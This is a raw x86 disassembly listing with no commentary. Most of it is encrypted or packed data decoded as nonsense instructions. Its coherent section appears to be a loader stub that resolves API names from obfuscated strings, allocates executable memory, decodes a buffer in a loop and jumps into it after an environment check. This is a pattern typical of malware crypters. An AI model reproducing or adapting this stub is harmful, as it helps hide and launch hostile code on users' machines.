  42144c:	and    eax,0xb01d12a5
  421451:	ret    0x1328
  421454:	cmp    BYTE PTR [ebx],0x62
  421457:	push   0xffffff93
  421459:	daa    
  42145a:	xchg   edi,eax
  42145b:	js     0x42142b
  42145d:	je     0x42148a
  42145f:	icebp  
  421460:	les    edi,FWORD PTR [ecx+0xe17c2b6]
  421466:	push   ebp
  421467:	push   cs
  421468:	arpl   si,dx
  42146a:	ss adc esp,ecx
  42146d:	cmc    
  42146e:	xchg   esi,ebx
  421470:	and    DWORD PTR [eax+0xf8662db],ecx
  421476:	xor    eax,0xc091a477
  42147b:	stos   DWORD PTR es:[edi],eax
  42147c:	fisttp WORD PTR [esi+0x75b08cf6]
  421482:	adc    BYTE PTR [esi-0x7a83380f],cl
  421488:	or     al,0x8d
  42148a:	loope  0x4214eb
  42148c:	dec    BYTE PTR [esi+eiz*4+0x68b48475]
  421493:	add    BYTE PTR [esi-0xd],bh
  421496:	mov    dl,0xdc
  421498:	inc    eax
  421499:	cmc    
  42149a:	and    eax,0x660348d8
  42149f:	enter  0x37af,0x3e
  4214a3:	sub    al,BYTE PTR [edx+0x43]
  4214a6:	leave  
  4214a7:	mov    ebx,0x3cce861a
  4214ac:	xchg   esp,eax
  4214ad:	cli    
  4214ae:	push   ebx
  4214af:	int    0x4f
  4214b1:	mov    WORD PTR [ebp+0x15ac0a4],fs
  4214b7:	mov    esp,0xf5e9eb75
  4214bc:	cdq    
  4214bd:	test   DWORD PTR [ebp-0x6b],0xc4e9f1b
  4214c4:	ss push es
  4214c6:	std    
  4214c7:	xor    BYTE PTR [esi+0x33],dh
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x268d3437
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x3f1890f3
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	(bad)  
  42182e:	(bad)  
  42182f:	pop    edx
  421830:	cmp    eax,0xf899486a
  421835:	repz pop ecx
  421837:	mov    eax,ds:0x4c4796f0
  42183c:	add    BYTE PTR [ebp-0x766b42e],ch
  421842:	repz pop ebp
  421844:	mov    eax,ds:0xb3b8d6f0
  421849:	add    BYTE PTR [ebp-0x766b496],ch
  42184f:	repz pop ebp
  421851:	mov    eax,ds:0xb3b896f0
  421856:	add    BYTE PTR [ebp-0x766b496],ch
  42185c:	repz pop ebp
  42185e:	mov    eax,ds:0xb3b896f0
  421863:	add    BYTE PTR [ebp-0x766b496],ch
  421869:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186b:	mov    eax,ds:0xacb696f0
  421870:	mov    edx,0x90ff6aa3
  421875:	xor    eax,0xbca0e5d2
  42187a:	pop    ebx
  42187b:	cdq    
  42187c:	out    0x68,eax
  42187e:	les    ebx,FWORD PTR [ecx]
  421880:	imul   ebp,ecx,0xffffff8a
  421883:	pushf  
  421884:	cmp    dl,bl
  421886:	xchg   ecx,eax
  421887:	sti    
  421888:	cwde   
  421889:	shl    BYTE PTR [ecx-0x3d],1
  42188c:	add    al,0x24
  42188e:	in     eax,dx
  42188f:	fcom   DWORD PTR [ecx-0x1c7d7ec8]
  421895:	(bad)  
  421896:	xchg   ebx,eax
  421897:	imul   eax,ebx,0xabd60f4a
  42189d:	shl    DWORD PTR [eax],cl
  42189f:	into   
  4218a0:	xchg   esp,eax
  4218a1:	repz xchg esi,eax
  4218a3:	mov    esi,0x4b4ea70d
  4218a8:	cdq    
  4218a9:	clc    
  4218aa:	repz pop ebp
  4218ac:	mov    eax,ds:0x4f2191f0
  4218b1:	pop    ecx
  4218b2:	out    dx,al
  4218b3:	xchg   edx,eax
  4218b4:	fst    DWORD PTR [ebx-0x5430f445]
  4218ba:	mov    bl,0x6e
  4218bc:	sub    bh,BYTE PTR [ecx+0x4166c858]
  4218c2:	mov    BYTE PTR [eax],0x61
  4218c5:	push   edi
  4218c6:	stc    
  4218c7:	xchg   ebp,eax
  4218c8:	scas   al,BYTE PTR es:[edi]
  4218c9:	mov    dl,0x71
  4218cb:	clc    
  4218cc:	aas    
  4218cd:	pusha  
  4218ce:	adc    edi,esp
  4218d0:	sar    ecx,0x35
  4218d3:	pop    ecx
  4218d4:	bound  ebx,QWORD PTR [esp+edx*4+0x2ca7393d]
  4218db:	mov    bl,0xb
  4218dd:	repnz mov ecx,0xdcfab0dd
  4218e3:	inc    eax
  4218e4:	and    DWORD PTR [edx],ecx
  4218e6:	out    0xea,eax
  4218e8:	dec    edx
  4218e9:	xchg   ebx,eax
  4218ea:	mov    al,ds:0xb3abcf0b
  4218ef:	outs   dx,BYTE PTR ds:[esi]
  4218f0:	sub    edi,DWORD PTR [ecx+0x41f85428]
  4218f6:	and    BYTE PTR es:[ebx+0x57],dh
  4218fa:	in     al,dx
  4218fb:	or     BYTE PTR [edx+esi*4],al
  4218fe:	jmp    0x421965
  421900:	nop
  421901:	pusha  
  421902:	inc    ebx
  421903:	popa   
  421904:	push   0xfffffff9
  421906:	add    eax,0xfa9cf8c4
  42190b:	dec    ebx
  42190c:	xchg   edx,eax
  42190d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42190e:	xor    ch,BYTE PTR [esi]
  421910:	xchg   esi,eax
  421911:	repnz mov cl,0xa5
  421914:	xor    edi,edx
  421916:	(bad)  
  421917:	rcl    eax,1
  421919:	push   0x93d992ee
  42191e:	clc    
  42191f:	repz pop ebp
  421921:	mov    eax,ds:0xb3b896f0
  421926:	push   eax
  421927:	call   0xfa176496
  42192c:	icebp  
  42192d:	pop    ebp
  42192e:	add    DWORD PTR [eax],esp
  421930:	std    
  421931:	div    DWORD PTR [ebx+0x4b6aad00]
  421937:	cdq    
  421938:	clc    
  421939:	repz mov ebp,0xb397f3a1
  42193f:	mov    dl,0xa
  421941:	lods   eax,DWORD PTR ds:[esi]
  421942:	push   0xffffffa5
  421944:	popf   
  421945:	clc    
  421946:	repz loope 0x4218f0
  421949:	lock xchg esi,eax
  42194b:	mov    eax,0xd7bc00b3
  421950:	dec    ebx
  421951:	cdq    
  421952:	clc    
  421953:	jecxz  0x4219b2
  421955:	mov    eax,ds:0xb3bd96f0
  42195a:	add    BYTE PTR [ebp-0x1766b4d5],ch
  421960:	repz pop ebp
  421962:	mov    eax,ds:0xb6b896f2
  421967:	add    BYTE PTR [edx+ebp*2-0xc0766b5],ch
  42196e:	pop    eax
  42196f:	mov    eax,ds:0xb3b896f1
  421974:	add    BYTE PTR [ebp-0x76ae496],ch
  42197a:	repz pop ecx
  42197c:	mov    eax,ds:0xb65c97f0
  421981:	add    BYTE PTR [edi-0x7e6b496],ch
  421987:	repz dec ebp
  421989:	mov    eax,ds:0xb3b886f0
  42198e:	add    BYTE PTR [ebp-0x1766b486],ch
  421994:	repz pop ebp
  421996:	mov    eax,ds:0xa3b896f0
  42199b:	add    BYTE PTR [ebp-0x766b496],ch
  4219a1:	repz pop ebp
  4219a3:	mov    eax,ds:0x8a4c96f0
  4219a8:	or     al,0xad
  4219aa:	add    ecx,DWORD PTR [eax-0x67]
  4219ad:	clc    
  4219ae:	rep lods eax,DWORD PTR ds:[esi]
  4219b0:	stos   BYTE PTR es:[edi],al
  4219b1:	lock fyl2x 
  4219b4:	mov    bl,0x0
  4219b6:	lods   eax,DWORD PTR ds:[esi]
  4219b7:	push   0x4b
  4219b9:	cdq    
  4219ba:	clc    
  4219bb:	repz pop ebp
  4219bd:	mov    eax,ds:0xb3b896f0
  4219c2:	add    BYTE PTR [ebp-0x766b496],ch
  4219c8:	repz pop ebp
  4219ca:	mov    eax,ds:0xb3b896f0
  4219cf:	add    BYTE PTR [ebp-0x766b496],ch
  4219d5:	repz pop ebp
  4219d7:	mov    eax,ds:0xb3b896f0
  4219dc:	add    BYTE PTR [ebp-0x766b496],ch
  4219e2:	repz pop ebp
  4219e4:	mov    eax,ds:0xb3b896f0
  4219e9:	add    BYTE PTR [ebp-0x766b496],ch
  4219ef:	repz pop ebp
  4219f1:	mov    eax,ds:0xb3b896f0
  4219f6:	add    BYTE PTR [ebp-0x766b496],ch
  4219fc:	repz pop ebp
  4219fe:	mov    eax,ds:0xb3b896f0
  421a03:	add    BYTE PTR [ebp-0x766b496],ch
  421a09:	repz pop ebp
  421a0b:	mov    eax,ds:0xb3b896f0
  421a10:	add    BYTE PTR [ebp-0x766b496],ch
  421a16:	repz pop ebp
  421a18:	mov    eax,ds:0xb3b896f0
  421a1d:	add    BYTE PTR [ebx-0x731ed1e2],al
  421a23:	repz pop ebp
  421a25:	mov    eax,ds:0xb3b376f0
  421a2a:	add    BYTE PTR [ebp+0x2c994b6a],bh
  421a30:	neg    DWORD PTR [ebp-0x5f]
  421a33:	hlt    
  421a34:	xchg   esi,eax
  421a35:	mov    eax,0x58ee45e3
  421a3a:	pop    ds
  421a3b:	(bad)  
  421a3c:	clc    
  421a3d:	repz pop ebp
  421a3f:	mov    eax,ds:0xb39896f0
  421a44:	add    BYTE PTR [ebp+0x44],cl
  421a47:	cmp    edx,ebp
  421a49:	mov    dl,BYTE PTR [eax-0x690f5ea3]
  421a4f:	fdiv   DWORD PTR [ebx+0x409aad00]
  421a55:	cdq    
  421a56:	clc    
  421a57:	test   eax,0x4ef0a15d
  421a5c:	mov    esp,0x6aad00b3
  421a61:	dec    ebx
  421a62:	cdq    
  421a63:	clc    
  421a64:	repz pop ebp
  421a66:	mov    eax,ds:0x93b896f0
  421a6b:	add    BYTE PTR [ebp-0x766b476],ch
  421a71:	repz pop ebp
  421a73:	mov    eax,ds:0xb3b896f0
  421a78:	add    BYTE PTR [ebp-0x766b496],ch
  421a7e:	repz pop ebp
  421a80:	mov    eax,ds:0xb3b896f0
  421a85:	add    BYTE PTR [ebp-0x766b496],ch
  421a8b:	repz pop ebp
  421a8d:	mov    eax,ds:0xb3b896f0
  421a92:	add    BYTE PTR [ebp-0x766b496],ch
  421a98:	repz pop ebp
  421a9a:	mov    eax,ds:0xb3b896f0
  421a9f:	add    BYTE PTR [ebp-0x766b496],ch
  421aa5:	repz pop ebp
  421aa7:	mov    eax,ds:0xb3b896f0
  421aac:	add    BYTE PTR [ebp-0x766b496],ch
  421ab2:	repz pop ebp
  421ab4:	mov    eax,ds:0xb3b896f0
  421ab9:	add    BYTE PTR [ebp-0x766b496],ch
  421abf:	repz pop ebp
  421ac1:	mov    eax,ds:0xb3b896f0
  421ac6:	add    BYTE PTR [ebp-0x766b496],ch
  421acc:	repz pop ebp
  421ace:	mov    eax,ds:0xb3b896f0
  421ad3:	add    BYTE PTR [ebp-0x766b496],ch
  421ad9:	repz pop ebp
  421adb:	mov    eax,ds:0xb3b896f0
  421ae0:	add    BYTE PTR [ebp-0x766b496],ch
  421ae6:	repz pop ebp
  421ae8:	mov    eax,ds:0xb3b896f0
  421aed:	add    BYTE PTR [ebp-0x766b496],ch
  421af3:	repz pop ebp
  421af5:	mov    eax,ds:0xb3b896f0
  421afa:	add    BYTE PTR [ebp-0x766b496],ch
  421b00:	repz pop ebp
  421b02:	mov    eax,ds:0xb3b896f0
  421b07:	add    BYTE PTR [ebp-0x766b496],ch
  421b0d:	repz pop ebp
  421b0f:	mov    eax,ds:0xb3b896f0
  421b14:	add    BYTE PTR [ebp-0x766b496],ch
  421b1a:	repz pop ebp
  421b1c:	mov    eax,ds:0xb3b896f0
  421b21:	add    BYTE PTR [ebp-0x766b496],ch
  421b27:	repz pop ebp
  421b29:	mov    eax,ds:0xb3b896f0
  421b2e:	add    BYTE PTR [ebp-0x766b496],ch
  421b34:	repz pop ebp
  421b36:	mov    eax,ds:0xb3b896f0
  421b3b:	add    BYTE PTR [ebp-0x766b496],ch
  421b41:	repz pop ebp
  421b43:	mov    eax,ds:0xb3b896f0
  421b48:	add    BYTE PTR [ebp-0x766b496],ch
  421b4e:	repz pop ebp
  421b50:	mov    eax,ds:0xb3b896f0
  421b55:	add    BYTE PTR [ebp-0x766b496],ch
  421b5b:	repz pop ebp
  421b5d:	mov    eax,ds:0xb3b896f0
  421b62:	add    BYTE PTR [ebp-0x766b496],ch
  421b68:	repz pop ebp
  421b6a:	mov    eax,ds:0xb3b896f0
  421b6f:	add    BYTE PTR [ebp-0x766b496],ch
  421b75:	repz pop ebp
  421b77:	mov    eax,ds:0xb3b896f0
  421b7c:	add    BYTE PTR [ebp-0x766b496],ch
  421b82:	repz pop ebp
  421b84:	mov    eax,ds:0xb3b896f0
  421b89:	add    BYTE PTR [ebp-0x766b496],ch
  421b8f:	repz pop ebp
  421b91:	mov    eax,ds:0xb3b896f0
  421b96:	add    BYTE PTR [ebp-0x766b496],ch
  421b9c:	repz pop ebp
  421b9e:	mov    eax,ds:0xb3b896f0
  421ba3:	add    BYTE PTR [ebp-0x766b496],ch
  421ba9:	repz pop ebp
  421bab:	mov    eax,ds:0xb3b896f0
  421bb0:	add    BYTE PTR [ebp-0x766b496],ch
  421bb6:	repz pop ebp
  421bb8:	mov    eax,ds:0xb3b896f0
  421bbd:	add    BYTE PTR [ebp-0x766b496],ch
  421bc3:	repz pop ebp
  421bc5:	mov    eax,ds:0xb3b896f0
  421bca:	add    BYTE PTR [ebp-0x766b496],ch
  421bd0:	repz pop ebp
  421bd2:	mov    eax,ds:0xb3b896f0
  421bd7:	add    BYTE PTR [ebp-0x766b496],ch
  421bdd:	repz pop ebp
  421bdf:	mov    eax,ds:0xb3b896f0
  421be4:	add    BYTE PTR [ebp-0x766b496],ch
  421bea:	repz pop ebp
  421bec:	mov    eax,ds:0xb3b896f0
  421bf1:	add    BYTE PTR [ebp-0x766b496],ch
  421bf7:	repz pop ebp
  421bf9:	mov    eax,ds:0xb3b896f0
  421bfe:	add    BYTE PTR [ebp-0x766b496],ch
  421c04:	repz pop ebp
  421c06:	mov    eax,ds:0xb3b896f0
  421c0b:	add    BYTE PTR [ebp-0x766b496],ch
  421c11:	repz pop ebp
  421c13:	mov    eax,ds:0xb3b896f0
  421c18:	add    BYTE PTR [ebp-0x766b496],ch
  421c1e:	repz pop ebp
  421c20:	mov    eax,ds:0xb3b896f0
  421c25:	add    BYTE PTR [ebp-0x766b496],ch
  421c2b:	repz pop ebp
  421c2d:	mov    eax,ds:0xb3b33e9f
  421c32:	das    
  421c33:	lods   eax,DWORD PTR ds:[esi]
  421c34:	push   0x5b
  421c36:	cdq    
  421c37:	clc    
  421c38:	fcos   
  421c3a:	jnp    0x421bbd
  421c3c:	lock inc edi
  421c3e:	sahf   
  421c3f:	sahf   
  421c40:	sub    bh,BYTE PTR [edx]
  421c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c43:	scas   eax,DWORD PTR es:[edi]
  421c44:	adc    al,ah
  421c46:	jmp    0x3d29b27f
  421c4b:	jmp    0x5e1f3863
  421c50:	hlt    
  421c51:	sbb    al,0x79
  421c53:	fsub   QWORD PTR [edi-0x22]
  421c56:	hlt    
  421c57:	sub    BYTE PTR [ecx+edi*1-0x7105da62],cl
  421c5e:	(bad)  
  421c60:	jp     0x421c68
  421c62:	js     0x421c27
  421c64:	jmp    0x57e1c647
  421c69:	xchg   esi,eax
  421c6a:	lea    ecx,[ecx-0x6d]
  421c6d:	push   edx
  421c6e:	jg     0x421c44
  421c70:	sub    eax,0x82c560f4
  421c75:	xchg   edx,eax
  421c76:	aad    0x93
  421c78:	pop    ss
  421c79:	xchg   edi,eax
  421c7a:	jge    0x421c7e
  421c7c:	jmp    DWORD PTR [edi+0x12]
  421c7f:	sahf   
  421c80:	inc    ebp
  421c81:	aad    0x2c
  421c83:	sbb    bl,dl
  421c85:	ss inc edx
  421c87:	sbb    ecx,DWORD PTR [eax-0x16c6f473]
  421c8d:	loop   0x421c39
  421c8f:	fmulp  st(1),st
  421c91:	stos   BYTE PTR es:[edi],al
  421c92:	xchg   ebx,eax
  421c93:	pop    ss
  421c94:	jl     0x421ce7
  421c96:	xchg   ecx,eax
  421c97:	sbb    eax,0x811415d8
  421c9c:	(bad)  
  421c9d:	loopne 0x421c50
  421c9f:	mov    bl,0x14
  421ca1:	bound  eax,QWORD PTR [ecx]
  421ca3:	jmp    0x421c6e
  421ca5:	or     cl,BYTE PTR [ecx]
  421ca7:	inc    esi
  421ca8:	adc    DWORD PTR [ecx],edx
  421caa:	(bad)  
  421cab:	fcmovnbe st,st(6)
  421cad:	or     al,0x6c
  421caf:	nop
  421cb0:	cmp    al,0x21
  421cb2:	mov    bh,0xdd
  421cb4:	mov    ds:0x9366d7f3,al
  421cb9:	mov    ebp,0x7fe8c837
  421cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cbf:	fsub   QWORD PTR [eax+0x9422a74]
  421cc5:	lds    edi,FWORD PTR [esi+0x4e]
  421cc8:	jo     0x421d1d
  421cca:	cli    
  421ccb:	sbb    ch,cl
  421ccd:	stos   DWORD PTR es:[edi],eax
  421cce:	mov    bl,0xab
  421cd0:	lds    eax,FWORD PTR [ecx]
  421cd2:	imul   esp,edx,0xe8ee1d7a
  421cd8:	mov    edx,0xd7b8590e
  421cdd:	inc    esi
  421cde:	(bad)  [eax+0x77]
  421ce1:	cdq    
  421ce2:	ins    DWORD PTR es:[edi],dx
  421ce3:	mov    ah,0xda
  421ce5:	xchg   ecx,eax
  421ce6:	int    0xd8
  421ce8:	repnz sbb eax,0x335ad954
  421cee:	andps  xmm7,XMMWORD PTR [edi+0x7655472]
  421cf5:	and    eax,DWORD PTR [edx-0x3b]
  421cf8:	xchg   esp,eax
  421cf9:	dec    eax
  421cfa:	ja     0x421cd7
  421cfc:	or     ebp,DWORD PTR [edi+0x2c]
  421cff:	add    ch,BYTE PTR [edi+0x645b3dc9]
  421d05:	or     al,0x6d
  421d07:	pop    eax
  421d08:	loopne 0x421ce0
  421d0a:	or     al,0x4d
  421d0c:	add    DWORD PTR [eax],esi
  421d0e:	mov    al,0x5d
  421d10:	inc    ebp
  421d11:	popf   
  421d12:	xor    ecx,DWORD PTR [ebx+0x5fbbe1b4]
  421d18:	pop    ds
  421d19:	(bad)  
  421d1a:	dec    eax
  421d1b:	cmp    esi,DWORD PTR [ecx+0x46]
  421d1e:	jnp    0x421cdf
  421d20:	inc    ebp
  421d21:	sbb    ebx,edx
  421d23:	aas    
  421d24:	jge    0x421d0f
  421d26:	mov    dl,0xc5
  421d28:	stc    
  421d29:	jmp    0xa2d606bf
  421d2e:	retf   
  421d2f:	mov    al,ds:0x6127cddb
  421d34:	sbb    al,0x7
  421d36:	xchg   BYTE PTR [edi],al
  421d38:	je     0x421d3a
  421d3a:	push   eax
  421d3b:	data16 mov dl,0x9d
  421d3e:	xchg   DWORD PTR [esi],edi
  421d40:	xor    DWORD PTR [ecx],ecx
  421d42:	adc    BYTE PTR [esi+0x9],bh
  421d45:	xor    bl,bl
  421d47:	gs imul edi
  421d4a:	out    dx,al
  421d4b:	mov    ds:0xfec40fcc,al
  421d50:	xor    eax,0x989f6a34
  421d55:	xchg   ecx,eax
  421d56:	test   al,0x8a
  421d58:	push   eax
  421d59:	addr16 cdq 
  421d5b:	cmp    eax,0x5b6cc4c9
  421d60:	mov    al,0x13
  421d62:	ds jbe 0x421d81
